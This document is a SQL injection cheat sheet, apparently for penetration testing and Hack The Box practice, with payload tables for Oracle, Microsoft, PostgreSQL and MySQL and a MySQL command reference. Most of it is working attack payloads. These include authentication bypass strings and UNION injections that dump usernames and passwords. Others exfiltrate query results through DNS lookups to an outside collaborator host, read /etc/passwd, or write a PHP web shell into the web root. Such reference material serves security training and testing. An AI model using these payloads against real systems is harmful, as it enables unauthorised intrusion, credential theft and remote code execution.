# 📜 SQL Injection Cheat Sheet

### Some nice links: <a href="#string-concatenation" id="string-concatenation"></a>

[https://www.openbugbounty.org/blog/ismailtsdln/sql-injection-payload-list/](https://www.openbugbounty.org/blog/ismailtsdln/sql-injection-payload-list/)

### String concatenation <a href="#string-concatenation" id="string-concatenation"></a>

You can concatenate together multiple strings to make a single string.

| Oracle     | `'foo'\|\|'bar'`                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `'foo'+'bar'`                                                                                                    |
| PostgreSQL | `'foo'\|\|'bar'`                                                                                                 |
| MySQL      | <p><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code><br></p> |

### Substring <a href="#substring" id="substring"></a>

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### Comments <a href="#comments" id="comments"></a>

You can use comments to truncate a query and remove the portion of the original query that follows your input.

| Oracle     | <p><code>--comment</code><br></p>                                                                                          |
| ---------- | -------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| PostgreSQL | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| MySQL      | <p><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></p> |

### Database version <a href="#database-version" id="database-version"></a>

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Oracle     | <p><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code><br></p> |
| ---------- | --------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT @@version`                                                                                  |
| PostgreSQL | `SELECT version()`                                                                                  |
| MySQL      | `SELECT @@version`                                                                                  |

### Database contents <a href="#database-contents" id="database-contents"></a>

You can list the tables that exist in the database, and the columns that those tables contain.

| Oracle     | <p><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></p>                               |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |
| PostgreSQL | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |
| MySQL      | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |

### Conditional errors <a href="#conditional-errors" id="conditional-errors"></a>

You can test a single boolean condition and trigger a database error if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| ---------- | --------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Extracting data via visible error messages <a href="#extracting-data-via-visible-error-messages" id="extracting-data-via-visible-error-messages"></a>

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | <p><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code><br><br><code>> Conversion failed when converting the varchar value 'secret' to data type int.</code></p> |
| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PostgreSQL | <p><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code><br><br><code>> invalid input syntax for integer: "secret"</code></p>                     |
| MySQL      | <p><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code><br><br><code>> XPATH syntax error: '\secret'</code></p>               |

### Batched (or stacked) queries <a href="#batched-or-stacked-queries" id="batched-or-stacked-queries"></a>

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Oracle     | `Does not support batched queries.`                                                      |
| ---------- | ---------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>QUERY-1-HERE; QUERY-2-HERE</code><br><code>QUERY-1-HERE QUERY-2-HERE</code></p> |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                                                             |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                                                             |

**Note**

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

### Time delays <a href="#time-delays" id="time-delays"></a>

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

### Conditional time delays <a href="#conditional-time-delays" id="conditional-time-delays"></a>

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |

### DNS lookup <a href="#dns-lookup" id="dns-lookup"></a>

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

| Oracle     | <p>(<a href="https://portswigger.net/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p><p><code>SELECT EXTRACTVALUE(xmltype('&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual</code></p><p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p><p><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></p> |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| MySQL      | <p>The following techniques work on Windows only:</p><p><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></p>                                                                                                                                                                                                                                                                                                                                                                                                                               |

### DNS lookup with data exfiltration <a href="#dns-lookup-with-data-exfiltration" id="dns-lookup-with-data-exfiltration"></a>

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                                                                                                                                                        |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                                                                                                                                               |
| PostgreSQL | <p><code>create OR replace function f() returns void as $$</code><br><code>declare c text;</code><br><code>declare p text;</code><br><code>begin</code><br><code>SELECT into p (SELECT YOUR-QUERY-HERE);</code><br><code>c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';</code><br><code>execute c;</code><br><code>END;</code><br><code>$$ language plpgsql security definer;</code><br><code>SELECT f();</code></p> |
| MySQL      | <p>The following technique works on Windows only:<br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></p>                                                                                                                                                                                                                                                                                                                |

###

### MySQL

| **Command**                                                       | **Description**                                          |
| ----------------------------------------------------------------- | -------------------------------------------------------- |
| **General**                                                       |                                                          |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                | login to mysql database                                  |
| `SHOW DATABASES`                                                  | List available databases                                 |
| `USE users`                                                       | Switch to database                                       |
| **Tables**                                                        |                                                          |
| `CREATE TABLE logins (id INT, ...)`                               | Add a new table                                          |
| `SHOW TABLES`                                                     | List available tables in current database                |
| `DESCRIBE logins`                                                 | Show table properties and columns                        |
| `INSERT INTO table_name VALUES (value_1,..)`                      | Add values to table                                      |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table                |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`  | Update table values                                      |
| **Columns**                                                       |                                                          |
| `SELECT * FROM table_name`                                        | Show all columns in a table                              |
| `SELECT column1, column2 FROM table_name`                         | Show specific columns in a table                         |
| `DROP TABLE logins`                                               | Delete a table                                           |
| `ALTER TABLE logins ADD newColumn INT`                            | Add new column                                           |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`         | Rename column                                            |
| `ALTER TABLE logins MODIFY oldColumn DATE`                        | Change column datatype                                   |
| `ALTER TABLE logins DROP oldColumn`                               | Delete column                                            |
| **Output**                                                        |                                                          |
| `SELECT * FROM logins ORDER BY column_1`                          | Sort by column                                           |
| `SELECT * FROM logins ORDER BY column_1 DESC`                     | Sort by column in descending order                       |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`             | Sort by two-columns                                      |
| `SELECT * FROM logins LIMIT 2`                                    | Only show first two results                              |
| `SELECT * FROM logins LIMIT 1, 2`                                 | Only show first two results starting from index 2        |
| `SELECT * FROM table_name WHERE <condition>`                      | List results that meet a condition                       |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`               | List results where the name is similar to a given string |

### MySQL Operator Precedence

* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

### SQL Injection

| **Payload**                                                                                                                                | **Description**                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| **Auth Bypass**                                                                                                                            |                                                      |
| `admin' or '1'='1`                                                                                                                         | Basic Auth Bypass                                    |
| `admin')-- -`                                                                                                                              | Basic Auth Bypass With comments                      |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)              |                                                      |
| **Union Injection**                                                                                                                        |                                                      |
| `' order by 1-- -`                                                                                                                         | Detect number of columns using `order by`            |
| `cn' UNION select 1,2,3-- -`                                                                                                               | Detect number of columns using Union injection       |
| `cn' UNION select 1,@@version,3,4-- -`                                                                                                     | Basic Union injection                                |
| `UNION select username, 2, 3, 4 from passwords-- -`                                                                                        | Union injection for 4 columns                        |
| **DB Enumeration**                                                                                                                         |                                                      |
| `SELECT @@version`                                                                                                                         | Fingerprint MySQL with query output                  |
| `SELECT SLEEP(5)`                                                                                                                          | Fingerprint MySQL with no output                     |
| `cn' UNION select 1,database(),2,3-- -`                                                                                                    | Current database name                                |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                                  | List all databases                                   |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                                 | List all tables in a specific database               |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`                | List all columns in a specific table                 |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                                       | Dump data from a table in another database           |
| **Privileges**                                                                                                                             |                                                      |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges                          |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection**                                                                                                                         |                                                      |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |

